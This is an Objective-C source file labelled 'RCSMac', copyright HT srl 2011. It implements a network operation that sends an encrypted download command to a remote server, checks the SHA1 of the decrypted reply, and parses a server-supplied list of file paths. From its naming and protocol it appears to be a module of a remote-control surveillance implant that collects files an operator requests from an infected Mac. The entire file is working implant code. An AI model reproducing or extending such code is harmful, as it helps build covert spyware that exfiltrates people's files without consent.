/*
 * RCSMac - Download File Network Operation
 *
 *
 * Created on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "DownloadNetworkOperation.h"

#import "RCSICommon.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSMutableData+AES128.h"
#import "NSMutableData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSITaskManager.h"

//#import "RCSMLogger.h"
//#import "RCSMDebug.h"


@implementation DownloadNetworkOperation

@synthesize mDownloads;

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
      mDownloads = [[NSMutableArray alloc] init];
      
#ifdef DEBUG_DOWN_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [mDownloads release];
  [super dealloc];
}

- (BOOL)perform
{
#ifdef DEBUG_DOWN_NOP
  infoLog(@"");
#endif
  
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  int32_t i = 0;
  uint32_t command = PROTO_DOWNLOAD;
  NSMutableData *commandData = [[NSMutableData alloc] initWithBytes: &command
                                                             length: sizeof(uint32_t)];
  NSData *commandSha = [commandData sha1Hash];
  [commandData appendData: commandSha];
  
#ifdef DEBUG_DOWN_NOP
  infoLog(@"commandData: %@", commandData);
#endif
  
  [commandData encryptWithKey: gSessionKey];
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  NSMutableData *replyDecrypted = nil;
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  if (replyData == nil)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"empty reply from server");
#endif
      [commandData release];
      [outerPool release];
    
      return NO;
    }
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  [replyDecrypted decryptWithKey: gSessionKey];
  
#ifdef DEBUG_DOWN_NOP
  infoLog(@"replyDecrypted: %@", replyDecrypted);
#endif
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // remove padding
  [replyDecrypted removePadding];
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  @try
    {
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"exception on sha makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  shaLocal = [shaLocal sha1Hash];
  
#ifdef DEBUG_DOWN_NOP
  infoLog(@"shaRemote: %@", shaRemote);
  infoLog(@"shaLocal : %@", shaLocal);
#endif
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"sha mismatch");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"No download request available (command %d)", command);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
    
  uint32_t numOfStrings = 0;
  @try
    {
      [replyDecrypted getBytes: &numOfStrings
                         range: NSMakeRange(8, sizeof(uint32_t))];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_AUTH_NOP
      errorLog(@"exception on numOfStrings makerange (%@)", [e reason]);
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
#ifdef DEBUG_DOWN_NOP
  infoLog(@"downloads available: %d", numOfStrings);
#endif
  
  if (numOfStrings == 0)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"numOfStrings is zero!");
#endif
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      return NO;
    }
  
  uint32_t stringDataSize = 0;
  NSMutableData *strings;
  @try
    {
      [replyDecrypted getBytes: &stringDataSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      strings = [NSMutableData dataWithData:
                 [replyDecrypted subdataWithRange: NSMakeRange(12, stringDataSize)]];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG_DOWN_NOP
      errorLog(@"exception on stringDataSize makerange (%@)", [e reason]);
#endif
      
      return NO;
    }
  
  uint32_t len = 0;
  
  //
  // Unpascalize n NULL terminated UTF16LE strings
  //
  NSData *stringData;
  
  for (i = 0; i < numOfStrings; i++)
    {
      [strings getBytes: &len length: sizeof(uint32_t)];
      @try
        {
          stringData  = [strings subdataWithRange: NSMakeRange(0, len + 4)];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_DOWN_NOP
          errorLog(@"exception on stringData makerange (%@)", [e reason]);
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
      
      NSString *string = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
      
      if (string == nil)
        {
#ifdef DEBUG_DOWN_NOP
          errorLog(@"string is empty, error on unpascalize");
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
      
#ifdef DEBUG_DOWN_NOP
      infoLog(@"string: %@", string);
#endif
      
      [mDownloads addObject: string];
      
      @try
        {
          [strings replaceBytesInRange: NSMakeRange(0, len + 4)
                             withBytes: NULL
                                length: 0];
        }
      @catch (NSException *e)
        {
#ifdef DEBUG_DOWN_NOP
          errorLog(@"exception on replaceBytes makerange (%@)", [e reason]);
#endif
          
          [replyDecrypted release];
          [commandData release];
          [outerPool release];
          
          return NO;
        }
    }
  
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  return YES;
}

@end